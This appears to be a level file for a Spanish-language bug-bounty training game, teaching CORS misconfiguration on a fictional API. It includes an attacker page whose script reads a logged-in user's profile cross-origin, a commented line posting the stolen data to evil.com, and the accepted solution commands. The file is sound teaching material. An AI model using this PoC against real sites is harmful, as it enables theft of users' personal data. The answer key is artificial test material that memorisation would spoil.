// ============================================================
// bb-03-cors.js — Caso Bug Bounty: CORS Misconfiguration
// El jugador descubre que la API refleja cualquier Origin
// con credenciales, permitiendo robo de datos cross-origin.
// ============================================================

export default {
  id: "bb-cors-01",
  titulo: "CORS Misconfiguration — Robo de datos cross-origin",
  tipo: "cors",
  severidad: "MEDIA",
  nivel: 2,
  sla: 1800,
  xp: 300,
  bounty: 600,
  briefing: [
    "Programa de bug bounty: CloudAPI (plataforma de servicios cloud)",
    "Scope: api.cloudapi.com",
    " sospechas que la API tiene una configuración CORS débil.",
    "",
    "Usa `recon cloudapi.com` para explorar.",
    "Usa `test cors <origin>` para probar si refleja el Origin.",
    "Si funciona, `exploit cors` para demostrar el impacto.",
    "Finalmente: `report` para generar el reporte.",
    "",
    "IMPORTANTE: CORS con credenciales permite robar datos de usuarios logueados.",
  ].join("\n"),

  fs: {
    // API root
    "/target/api/": JSON.stringify({
      name: "CloudAPI v3",
      docs: "/api/docs",
      endpoints: ["/api/users/me", "/api/billing", "/api/files"],
    }, null, 2),

    // API - Perfil del usuario (autenticado por cookies)
    "/target/api/users/me": JSON.stringify({
      id: 42,
      name: "Laura Fernández",
      email: "laura@empresa.com",
      phone: "+34611223344",
      company: "StartupTech S.L.",
      role: "admin",
      api_key: "tk_test_ficticio_abc123",
    }, null, 2),

    // API - Facturación
    "/target/api/billing": JSON.stringify({
      user_id: 42,
      plan: "enterprise",
      monthly_fee: 299.99,
      payment_method: "Visa ****8765",
      invoices: [
        { id: "INV-001", date: "2026-08-01", amount: 299.99, status: "paid" },
        { id: "INV-002", date: "2026-07-01", amount: 299.99, status: "paid" },
      ],
    }, null, 2),

    // API - Archivos
    "/target/api/files": JSON.stringify([
      { id: 1, name: "contrato.pdf", size: "1.2MB", url: "/files/download/1" },
      { id: 2, name: "nominas.zip", size: "3.4MB", url: "/files/download/2" },
      { id: 3, name: "confidencial.docx", size: "567KB", url: "/files/download/3" },
    ], null, 2),

    // Página del atacante
    "/target/evil.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>Evil Page</title></head>",
      "<body>",
      "  <h1>Portfolio de Diseño</h1>",
      "  <p>Mi trabajo como diseñador gráfico...</p>",
      "  <script>",
      "    // En un ataque real, esto robaría datos del usuario logueado",
      '    fetch("https://api.cloudapi.com/users/me", {credentials: "include"})',
      "      .then(r => r.json())",
      "      .then(data => {",
      '        console.log("STOLEN:", data);',
      '        // Enviar a servidor del atacante:',
      '        // fetch("https://evil.com/collect", {method: "POST", body: JSON.stringify(data)});',
      "      })",
      "      .catch(e => console.log('Error:', e.message));",
      "  </script>",
      "</body>",
      "</html>",
    ].join("\n"),
  },

  objetivos: [
    {
      tipo: "recon",
      id: "descubrir-api",
      descripcion: "Descubrir la API de CloudAPI",
      puntos: 50,
    },
    {
      tipo: "test",
      id: "probar-cors-reflection",
      descripcion: "Probar si la API refleja el Origin",
      puntos: 100,
    },
    {
      tipo: "test",
      id: "probar-cors-credentials",
      descripcion: "Verificar si acepta credenciales cross-origin",
      puntos: 100,
    },
    {
      tipo: "exploit",
      id: "robar-datos",
      descripcion: "Exfiltrar datos de usuario logueado",
      puntos: 150,
    },
    {
      tipo: "report",
      id: "generar-reporte",
      descripcion: "Generar reporte con PoC HTML",
      puntos: 100,
    },
  ],

  soluciones: {
    recon: [
      "recon cloudapi.com",
      "scan cloudapi.com",
    ],
    cors: [
      "test cors http://evil.com",
      "test cors null",
    ],
    exploit: [
      "exploit cors",
    ],
    report: [
      "report",
    ],
  },

  evidencias: {
    "cors-reflection": "Access-Control-Allow-Origin: http://evil.com",
    "cors-credentials": "Access-Control-Allow-Credentials: true",
    "datos-robados": "/target/api/users/me",
  },

  informeEsperado: {
    titulo: "CORS Misconfiguration en CloudAPI",
    tipo: "Permissive Cross-origin Policy with Untrusted Domains",
    severidad: "MEDIA",
    endpoint: "https://api.cloudapi.com/*",
    impacto: "Robo de datos personales, API keys y facturación de usuarios logueados desde cualquier dominio",
    remediacion: "Implementar whitelist de orígenes permitidos. No reflejar Origin arbitrario con credenciales.",
  },

  bonusReporte: {
    conPoC: 50,
    conImpactoClaro: 50,
    conRemediacion: 50,
    conHtmlFuncional: 30,
  },
};
